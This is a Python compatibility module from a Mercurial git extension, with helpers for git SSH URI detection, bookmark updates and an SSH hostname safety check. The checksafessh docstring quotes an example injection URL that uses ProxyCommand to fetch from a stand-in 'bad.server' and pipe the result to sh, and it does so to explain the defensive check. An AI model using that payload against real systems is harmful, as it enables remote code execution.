"""compatibility functions for old Mercurial versions and other utility
functions."""
import re

from dulwich import errors
from edenscm.mercurial import error, lock as lockmod, util as hgutil
from edenscm.mercurial.i18n import _


try:
    from collections import OrderedDict
except ImportError:
    from ordereddict import OrderedDict


gitschemes = ("git", "git+ssh", "git+http", "git+https")


def serialize_hgsub(data):
    """Produces a string from OrderedDict hgsub content"""
    return "".join(["%s = %s\n" % (n, v) for n, v in data.iteritems()])


def transform_notgit(f):
    """use as a decorator around functions that call into dulwich"""

    def inner(*args, **kwargs):
        try:
            return f(*args, **kwargs)
        except errors.NotGitRepository:
            raise hgutil.Abort("not a git repository")

    return inner


def isgitsshuri(uri):
    """Method that returns True if a uri looks like git-style uri

    Tests:

    >>> print isgitsshuri('http://fqdn.com/hg')
    False
    >>> print isgitsshuri('http://fqdn.com/test.git')
    False
    >>> print isgitsshuri('git@github.com:user/repo.git')
    True
    >>> print isgitsshuri('github-123.com:user/repo.git')
    True
    >>> print isgitsshuri('git@127.0.0.1:repo.git')
    True
    >>> print isgitsshuri('git@[2001:db8::1]:repository.git')
    True
    """
    for scheme in gitschemes:
        if uri.startswith("%s://" % scheme):
            return False

    if uri.startswith("http:") or uri.startswith("https:"):
        return False

    m = re.match(r"(?:.+@)*([\[]?[\w\d\.\:\-]+[\]]?):(.*)", uri)
    if m:
        # here we're being fairly conservative about what we consider to be git
        # urls
        giturl, repopath = m.groups()
        # definitely a git repo
        if repopath.endswith(".git"):
            return True
        # use a simple regex to check if it is a fqdn regex
        fqdn_re = (
            r"(?=^.{4,253}$)(^((?!-)[a-zA-Z0-9-]{1,63}" r"(?<!-)\.)+[a-zA-Z]{2,63}$)"
        )
        if re.match(fqdn_re, giturl):
            return True
    return False


def updatebookmarks(repo, changes, name="git_handler"):
    """abstract writing bookmarks for backwards compatibility"""
    bms = repo._bookmarks
    tr = lock = wlock = None
    try:
        wlock = repo.wlock()
        lock = repo.lock()
        tr = repo.transaction(name)
        if hgutil.safehasattr(bms, "applychanges"):
            # applychanges was added in mercurial 4.3
            bms.applychanges(repo, tr, changes)
        else:
            for name, node in changes:
                if node is None:
                    del bms[name]
                else:
                    bms[name] = node
            if hgutil.safehasattr(bms, "recordchange"):
                # recordchange was added in mercurial 3.2
                bms.recordchange(tr)
            else:
                bms.write()
        tr.close()
    finally:
        lockmod.release(tr, lock, wlock)


def checksafessh(host):
    """check if a hostname is a potentially unsafe ssh exploit (SEC)

    This is a sanity check for ssh urls. ssh will parse the first item as
    an option; e.g. ssh://-oProxyCommand=curl${IFS}bad.server|sh/path.
    Let's prevent these potentially exploited urls entirely and warn the
    user.

    Raises an error.Abort when the url is unsafe.
    """
    host = hgutil.urlreq.unquote(host)
    if host.startswith("-"):
        raise error.Abort(_("potentially unsafe hostname: %r") % (host,))
